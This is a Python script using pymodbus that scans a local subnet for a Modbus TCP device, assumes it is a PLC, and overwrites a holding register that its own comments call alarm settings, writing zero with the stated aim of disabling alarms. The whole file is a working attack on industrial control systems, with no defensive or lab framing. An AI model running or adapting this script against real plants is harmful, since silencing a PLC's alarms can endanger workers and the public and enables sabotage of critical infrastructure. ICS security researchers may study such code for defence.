from pymodbus.client.sync import ModbusTcpClient
import socket
import ipaddress

# Configuration
SUBNET = "192.168.9.0/24"  # Subnet for scanning
ALARM_REGISTER_START = 100  # Hypothetical register for alarm settings
MODIFY_ALARM_VALUE = 0x00   # Example value to overwrite registers (e.g., disabling alarms)

def scan_network_for_plc(subnet):
    """
    Scans the subnet to find the PLC with Modbus TCP enabled.
    Returns the IP address if found, or None otherwise.
    """
    for ip in ipaddress.IPv4Network(subnet):
        try:
            # Try connecting to each IP with the Modbus default port 502
            client = ModbusTcpClient(str(ip))
            if client.connect():
                # Attempt a simple Modbus query to verify it is a PLC
                response = client.read_holding_registers(0, 1)
                client.close()
                if response.isError():
                    continue  # Not a valid Modbus response
                print(f"PLC Found at {ip}")
                return str(ip)
        except socket.error:
            pass
    print("PLC not found on the subnet.")
    return None

def modify_alarm_settings(plc_ip, register_start, value, count=1):
    """
    Connects to the PLC and modifies alarm settings in the specified Modbus register.
    """
    try:
        client = ModbusTcpClient(plc_ip)
        if client.connect():
            print(f"Connected to PLC at {plc_ip}. Modifying alarm settings...")
            # Write the value to the target register(s)
            response = client.write_registers(register_start, [value]*count)
            if response.isError():
                print("Error: Could not modify alarm settings.")
            else:
                print(f"Successfully modified {count} register(s) starting at {register_start}.")
            client.close()
        else:
            print(f"Failed to connect to PLC at {plc_ip}.")
    except Exception as e:
        print(f"Error during Modbus operation: {e}")

def main():
    # Step 1: Find the PLC's IP address
    print("Scanning the network for the PLC...")
    plc_ip = scan_network_for_plc(SUBNET)
    if not plc_ip:
        print("Exiting: Could not find PLC on the network.")
        return

    # Step 2: Modify the PLC's alarm settings
    modify_alarm_settings(plc_ip, ALARM_REGISTER_START, MODIFY_ALARM_VALUE)

if __name__ == "__main__":
    main()